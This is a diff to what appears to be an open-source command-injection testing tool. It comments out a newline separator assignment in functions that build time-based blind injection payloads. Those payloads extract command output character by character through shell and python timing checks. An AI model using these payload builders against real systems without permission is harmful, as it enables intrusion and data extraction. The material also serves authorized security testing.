@@ -56,7 +56,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
@@ -132,7 +132,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                  )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                  # Find the length of the output, using readline().
                  "str1=$(python -c \"print len(\'" + TAG + "\')\")" + separator + 
@@ -210,7 +210,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                  "str=\"$(echo $(" + cmd + "))\"" + separator + 
                  # Find the length of the output.
@@ -284,7 +284,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                  )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                  # Find the length of the output, using readline().
                  "str1=$(python -c \"print len(\'$(echo $(" + cmd + "))\')\")" + separator + 
@@ -363,7 +363,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                 # Grab the execution output.
                 "cmd=\"$(echo $(" + cmd + "))\"" + separator +     
@@ -445,7 +445,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                  )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                  "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\")" + separator +
                  "if [ " + str(ascii_char) + " != ${str} ]" + separator +
@@ -519,7 +519,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                  "str=\"$(" + cmd + ")\"" + separator + 
                  "if [ " + str(ascii_char) + " != $str ]" + separator + 
@@ -587,7 +587,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                  )
 
     elif separator == "%0a" :
-      separator = "\n"
+      #separator = "\n"
       payload = (separator + 
                  "str=$(python -c \"print $(echo $(" + cmd + "))\n\")" + separator +
                  "if [ " + str(ascii_char) + " != ${str} ]" + separator +
